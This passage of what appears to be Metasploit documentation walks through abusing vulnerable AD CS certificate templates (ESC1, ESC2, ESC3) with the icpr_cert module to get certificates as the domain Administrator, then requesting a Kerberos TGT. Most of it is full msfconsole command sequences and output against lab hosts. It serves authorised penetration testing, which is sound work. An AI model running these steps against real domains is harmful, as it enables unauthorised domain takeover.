id="using-the-esc1-vulnerability-to-get-a-certificate-as-the-domain-administrator"> <a href="#using-the-esc1-vulnerability-to-get-a-certificate-as-the-domain-administrator" class="anchor-heading" aria-labelledby="using-the-esc1-vulnerability-to-get-a-certificate-as-the-domain-administrator"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Using the ESC1 Vulnerability To Get a Certificate as the Domain Administrator</h2><p>Getting a certificate as the current user is great, but what we really want to do is elevate privileges if we can. Luckly we can also do this with the <code class="language-plaintext highlighter-rouge">icpr_cert</code> module. We just need to also set the <code class="language-plaintext highlighter-rouge">ALT_UPN</code> option to specify who we would like to authenticate as instead. Note that this only works with ESC1 vulnerable certificate templates which is why we can do this here.</p><p>If we know the domain name is <code class="language-plaintext highlighter-rouge">daforest.com</code> and the domain administrator of this domain is named <code class="language-plaintext highlighter-rouge">Administrator</code> we can quickly set this up:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf6</span> <span class="p">&gt;</span> use auxiliary/admin/dcerpc/icpr_cert
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA daforest-WIN-BR0CCBA815B-CA
CA =&gt; daforest-WIN-BR0CCBA815B-CA
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC1-Template
CERT_TEMPLATE =&gt; ESC1-Template
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBDomain DAFOREST
SMBDomain =&gt; DAFOREST
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass normaluser
SMBPass =&gt; normaluser
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser normal
SMBUser =&gt; normal
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ALT_UPN Administrator@daforest.com
ALT_UPN =&gt; Administrator@daforest.com
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216143830_default_unknown_windows.ad.cs_338144.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>We can then use the <code class="language-plaintext highlighter-rouge">kerberos/get_ticket</code> module to gain a Kerberos ticket granting ticket (TGT) as the <code class="language-plaintext highlighter-rouge">Administrator</code> domain administrator. See the <a href="#getting-a-kerberos-ticket">Getting A Kerberos Ticket</a> section for more information.</p><h1 id="exploiting-esc2-to-gain-domain-administrator-privileges"> <a href="#exploiting-esc2-to-gain-domain-administrator-privileges" class="anchor-heading" aria-labelledby="exploiting-esc2-to-gain-domain-administrator-privileges"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting ESC2 To Gain Domain Administrator Privileges</h1><p>From the previous enumeration efforts we know that the following certificate templates are vulnerable to ESC2:</p><ul><li>SubCA - Not exploitable as you have to be a Domain Admin or Enterprise Admin to enroll in this certificate<li>ESC2-Template - Enrollable by any authenticated user that is part of the Domain Users group, aka any authenticated domain user.</ul><p>We will use ESC2-Template to gain a TGT as the domain administrator user.</p><p>To do this we will use the <code class="language-plaintext highlighter-rouge">ipcr_cert</code> module and we will set the usual options, however we will need to run it twice. This is because with ESC2, we can’t use the vulnerability to request authentication certificates as other users without the <code class="language-plaintext highlighter-rouge">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag being set on the template. Instead what we can do is use the Any Purpose EKU or SubCA EKU that are set on these certificates to authenticate to the domain as the user who requested the certificate. So what we do is first get a ESC2 vulnerable certificate, then abuse the ability to use that certificate for any purpose to then request a certificate on behalf of another user, using that certificate as the form of authentication for this operation.</p><p>For the first run, we will set the usual <code class="language-plaintext highlighter-rouge">RHOSTS</code>, <code class="language-plaintext highlighter-rouge">CA</code>, and <code class="language-plaintext highlighter-rouge">CERT_TEMPLATE</code> details, being sure to set <code class="language-plaintext highlighter-rouge">CERT_TEMPLATE</code> to the vulnerable <code class="language-plaintext highlighter-rouge">ESC2-Template</code> certificate template, and supply valid SMB login credentials. This will grant us a certificate for our current user that is based off of the vulnerable <code class="language-plaintext highlighter-rouge">ESC2-Template</code>:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf6</span> <span class="p">&gt;</span> use auxiliary/admin/dcerpc/icpr_cert
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA daforest-WIN-BR0CCBA815B-CA
CA =&gt; daforest-WIN-BR0CCBA815B-CA
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC2-Template
CERT_TEMPLATE =&gt; ESC2-Template
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBDomain DAFOREST
SMBDomain =&gt; DAFOREST
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass normaluser
SMBPass =&gt; normaluser
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser normal
SMBUser =&gt; normal
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting              Required  Description
   ----           ---------------              --------  -----------
   ALT_DNS                                     no        Alternative certificate DNS
   ALT_UPN                                     no        Alternative certificate UPN (format: USER@DOMAIN)
   CA             daforest-WIN-BR0CCBA815B-CA  yes       The target certificate authority
   CERT_TEMPLATE  ESC2-Template                yes       The certificate template
   ON_BEHALF_OF                                no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                                         no        Certificate to request on behalf of
   RHOSTS         172.30.239.85                yes       The target host(s), see https://github.com/rapid7/metas
                                                         ploit-framework/wiki/Using-Metasploit
   RPORT          445                          yes       The target port (TCP)
   SMBDomain      DAFOREST                     no        The Windows domain to use for authentication
   SMBPass        normaluser                   no        The password for the specified username
   SMBUser        normal                       no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: normal@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-1611
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> loot

Loot
====

host  service  type           name             content               info                         path
----  -------  ----           ----             -------               ----                         ----
               windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx

<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>Next, we need to use the PFX file that we got to request another certificate to authenticate on behalf of another user. We will use the <code class="language-plaintext highlighter-rouge">PFX</code> option to specify the PFX file, and the <code class="language-plaintext highlighter-rouge">ON_BEHALF_OF</code> setting to specify the user we would like to authenticate on behalf of. Finally we will change the certificate template to another certificate template that we are able to enroll in. The default <code class="language-plaintext highlighter-rouge">User</code> certificate should work here since it allows enrollment by any authenticated domain user.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting              Required  Description
   ----           ---------------              --------  -----------
   ALT_DNS                                     no        Alternative certificate DNS
   ALT_UPN                                     no        Alternative certificate UPN (format: USER@DOMAIN)
   CA             daforest-WIN-BR0CCBA815B-CA  yes       The target certificate authority
   CERT_TEMPLATE  ESC2-Template                yes       The certificate template
   ON_BEHALF_OF                                no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                                         no        Certificate to request on behalf of
   RHOSTS         172.30.239.85                yes       The target host(s), see https://github.com/rapid7/metas
                                                         ploit-framework/wiki/Using-Metasploit
   RPORT          445                          yes       The target port (TCP)
   SMBDomain      DAFOREST                     no        The Windows domain to use for authentication
   SMBPass        normaluser                   no        The password for the specified username
   SMBUser        normal                       no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ON_BEHALF_OF DAFOREST\\Administrator
ON_BEHALF_OF =&gt; DAFOREST\Administrator
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set PFX /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
PFX =&gt; /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE User
CERT_TEMPLATE =&gt; User
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting                 Required  Description
   ----           ---------------                 --------  -----------
   ALT_DNS                                        no        Alternative certificate DNS
   ALT_UPN                                        no        Alternative certificate UPN (format: USER@DOMAIN)
   CA             daforest-WIN-BR0CCBA815B-CA     yes       The target certificate authority
   CERT_TEMPLATE  User                            yes       The certificate template
   ON_BEHALF_OF   DAFOREST\Administrator          no        Username to request on behalf of (format: DOMAIN\USE
                                                            R)
   PFX            /home/gwillcox/.msf4/loot/2022  no        Certificate to request on behalf of
                  1216154930_default_unknown_win
                  dows.ad.cs_104207.pfx
   RHOSTS         172.30.239.85                   yes       The target host(s), see https://github.com/rapid7/me
                                                            tasploit-framework/wiki/Using-Metasploit
   RPORT          445                             yes       The target port (TCP)
   SMBDomain      DAFOREST                        no        The Windows domain to use for authentication
   SMBPass        normaluser                      no        The password for the specified username
   SMBUser        normal                          no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216155701_default_unknown_windows.ad.cs_756798.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> loot

Loot
====

host  service  type           name             content               info                         path
----  -------  ----           ----             -------               ----                         ----
               windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
               windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216155701_default_unknown_windows.ad.cs_756798.pfx

<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>We can then use the <code class="language-plaintext highlighter-rouge">kerberos/get_ticket</code> module to gain a Kerberos ticket granting ticket (TGT) as the <code class="language-plaintext highlighter-rouge">Administrator</code> domain administrator. See the <a href="#getting-a-kerberos-ticket">Getting A Kerberos Ticket</a> section for more information.</p><h1 id="exploiting-esc3-to-gain-domain-administrator-privileges"> <a href="#exploiting-esc3-to-gain-domain-administrator-privileges" class="anchor-heading" aria-labelledby="exploiting-esc3-to-gain-domain-administrator-privileges"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting ESC3 To Gain Domain Administrator Privileges</h1><p>To exploit ESC3 vulnerable templates we will use a similar process to ESC2 templates but with slightly different steps. First, lets return to the earlier output where we can find several templates that are vulnerable to ESC3 attacks. However we need to split them by attack vector. The reason is that the first half of this attack needs to use the ESC3_TEMPLATE_1 vulnerable certificate templates to enroll in a certificate template that has the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) that allows one to request certificates on behalf of other principals (such as users or computers).</p><p>The second part of this attack will then require that we co-sign requests for another certificate using the certificate that we just got, to then request a certificate that can authenticate to the domain on behalf of another user. To do this we will need to look for certificates in the <code class="language-plaintext highlighter-rouge">ldap_esc_vulnerable_cert_finder</code> module which are labeled as being vulnerable to the ESC3_TEMPLATE_2 attack.</p><p>The list of ESC3_TEMPLATE_1 vulnerable templates is pretty short and consists of a single template:</p><ul><li>ESC3-TEMPLATE-1 - Vulnerable to ESC3_TEMPLATE_1 and allows enrollment via any authenticated domain user.</ul><p>ESC3_TEMPLATE_2 are more plentiful though and we can find a few that are of interest:</p><ul><li>SubCA - Again as mentioned earlier can only be enrolled in by Doman Admins and Enterprise Admins, so not a viable vector.<li>ESC3-Template2 - Enrollable via any authenticated domain user.<li>User - Enrollable via any authenticated domain user.<li>Administrator - Can only be enrolled in by Doman Admins and Enterprise Admins, so not a viable vector.<li>Machine - No real overlap between Domain Computers and Authenticated Users I don’t think?<li>DomainController - Can only be enrolled in by Domain Admins and Enterprise Admins, so not a viable vector.</ul><p>Narrowing this list down to those we can actually enroll in as users, this leaves us with <code class="language-plaintext highlighter-rouge">User</code> and <code class="language-plaintext highlighter-rouge">ESC3-Template2</code> as templates that can be used for the second part of this vulnerability.</p><p>We’ll first get the cert using <code class="language-plaintext highlighter-rouge">ipcr_cert</code> with the <code class="language-plaintext highlighter-rouge">ESC3-Template1</code> certificate.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf6</span> <span class="p">&gt;</span> use auxiliary/admin/dcerpc/icpr_cert
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   ALT_DNS                         no        Alternative certificate DNS
   ALT_UPN                         no        Alternative certificate UPN (format: USER@DOMAIN)
   CA                              yes       The target certificate authority
   CERT_TEMPLATE  User             yes       The certificate template
   ON_BEHALF_OF                    no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                             no        Certificate to request on behalf of
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framew
                                             ork/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        The Windows domain to use for authentication
   SMBPass                         no        The password for the specified username
   SMBUser                         no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser normal
SMBUser =&gt; normal
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass normaluser
SMBPass =&gt; normaluser
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBDomain DAFOREST
SMBDomain =&gt; DAFOREST
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA daforest-WIN-BR0CCBA815B-CA
CA =&gt; daforest-WIN-BR0CCBA815B-CA
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC3-Template1
CERT_TEMPLATE =&gt; ESC3-Template1
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: normal@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-1611
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> loot

Loot
====

host  service  type           name             content               info                         path
----  -------  ----           ----             -------               ----                         ----
               windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216173718_default_unknown_windows.ad.cs_580032.pfx
               windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx

<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>Next we’ll try use this certificate to request another certificate on behalf of a different user. For this stage we need to specify another certificate that is vulnerable to the ESC3_TEMPLATE_2 attack vector that we are able to enroll in. We will use the <code class="language-plaintext highlighter-rouge">User</code> template for this:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set PFX /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
PFX =&gt; /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ON_BEHALF_OF DAFOREST\\Administrator
ON_BEHALF_OF =&gt; DAFOREST\Administrator
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting                 Required  Description
   ----           ---------------                 --------  -----------
   ALT_DNS                                        no        Alternative certificate DNS
   ALT_UPN                                        no        Alternative certificate UPN (format: USER@DOMAIN)
   CA             daforest-WIN-BR0CCBA815B-CA     yes       The target certificate authority
   CERT_TEMPLATE  ESC3-Template1                  yes       The certificate template
   ON_BEHALF_OF   DAFOREST\Administrator          no        Username to request on behalf of (format: DOMAIN\USE
                                                            R)
   PFX            /home/gwillcox/.msf4/loot/2022  no        Certificate to request on behalf of
                  1216174221_default_unknown_win
                  dows.ad.cs_027866.pfx
   RHOSTS         172.30.239.85                   yes       The target host(s), see https://github.com/rapid7/me
                                                            tasploit-framework/wiki/Using-Metasploit
   RPORT          445                             yes       The target port (TCP)
   SMBDomain      DAFOREST                        no        The Windows domain to use for authentication
   SMBPass        normaluser                      no        The password for the specified username
   SMBUser        normal                          no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE User
CERT_TEMPLATE =&gt; User
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216174559_default_unknown_windows.ad.cs_570105.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>Just to show this is also possible with <code class="language-plaintext highlighter-rouge">ESC3-Template2</code> here is a snippet showing that also works:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC3-Template2
CERT_TEMPLATE =&gt; ESC3-Template2
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> show options

Module options (auxiliary/admin/dcerpc/icpr_cert):

   Name           Current Setting                 Required  Description
   ----           ---------------                 --------  -----------
   ALT_DNS                                        no        Alternative certificate DNS
   ALT_UPN                                        no        Alternative certificate UPN (format: USER@DOMAIN)
   CA             daforest-WIN-BR0CCBA815B-CA     yes       The target certificate authority
   CERT_TEMPLATE  ESC3-Template2                  yes       The certificate template
   ON_BEHALF_OF   DAFOREST\Administrator          no        Username to request on behalf of (format: DOMAIN\USE
                                                            R)
   PFX            /home/gwillcox/.msf4/loot/2022  no        Certificate to request on behalf of
                  1216174221_default_unknown_win
                  dows.ad.cs_027866.pfx
   RHOSTS         172.30.239.85                   yes       The target host(s), see https://github.com/rapid7/me
                                                            tasploit-framework/wiki/Using-Metasploit
   RPORT          445                             yes       The target port (TCP)
   SMBDomain      DAFOREST                        no        The Windows domain to use for authentication
   SMBPass        normaluser                      no        The password for the specified username
   SMBUser        normal                          no        The username to authenticate as


Auxiliary action:

   Name          Description
   ----          -----------
   REQUEST_CERT  Request a certificate



View the full module info with the info, or info -d command.

<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216180342_default_unknown_windows.ad.cs_390825.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>We can then use the <code class="language-plaintext highlighter-rouge">kerberos/get_ticket</code> module to gain a Kerberos ticket granting ticket (TGT) as the <code class="language-plaintext highlighter-rouge">Administrator</code> domain administrator. See the <a href="#getting-a-kerberos-ticket">Getting A Kerberos Ticket</a> section for more information.</p><h1 id="getting-a-kerberos-ticket"> <a href="#getting-a-kerberos-ticket" class="anchor-heading" aria-labelledby="getting-a-kerberos-ticket"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Getting A Kerberos Ticket</h1><p>Once a certificate for a user has been claimed, that certificate can be used to issue a Kerberos ticket granting ticket (TGT) which in tern can be used to authenticate to services.</p><p>Ticket granting tickets can be requested using the <a href="/docs/pentesting/active-directory/kerberos/get_ticket.html">kerberos/get_ticket</a> module by specifying the <code class="language-plaintext highlighter-rouge">CERT_FILE</code> option. Take the certificate file from the last stage of the attack and set it as the <code class="language-plaintext highlighter-rouge">CERT_FILE</code>. Certificates from Metasploit do not require a password, but if the certificate was generated from a source that added one, it can be specified in the <code class="language-plaintext highlighter-rouge">CERT_PASSWORD</code> option. Set the <code class="language-plaintext highlighter-rouge">RHOST</code> datastore option to the Domain Controller, then run the <code class="language-plaintext highlighter-rouge">GET_TGT</code> action.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf6</span> <span class="p">&gt;</span> use kerberos/get_ticket

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/admin/kerberos/get_ticket                   normal  No     Kerberos TGT/TGS Ticket Requester


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/kerberos/get_ticket

<span class="zs">[*]</span> Using auxiliary/admin/kerberos/get_ticket
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/kerberos/get_ticket</span><span class="p">)</span> <span class="p">&gt;</span> get_tgt rhosts=192.168.159.10 cert_file=/home/smcintyre/.msf4/loot/20230124173224_default_192.168.159.10_windows.ad.cs_287833.pfx
<span class="zs">[*]</span> Running module against 192.168.159.10

<span class="zs">[*]</span> 192.168.159.10:88 - Getting TGT for smcintyre@msflab.local
<span class="zg">[+]</span> 192.168.159.10:88 - Received a valid TGT-Response
<span class="zs">[*]</span> 192.168.159.10:88 - TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230124202354_default_192.168.159.10_mit.kerberos.cca_566767.bin
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/kerberos/get_ticket</span><span class="p">)</span> <span class="p">&gt;</span> klist
Kerberos Cache
==============
host            principal               sname                             issued                     status  path
----            ---------               -----                             ------                     ------  ----
192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-01-24 20:23:54 -0500  valid   /home/smcintyre/.msf4/loot/20230124202354_default_192.168.159.10_mit.kerberos.cca_566767.bin

<span class="zp">msf6</span> auxiliary<span class="p">(</span><span class="kc">admin/kerberos/get_ticket</span><span class="p">)</span> <span class="p">&gt;</span>
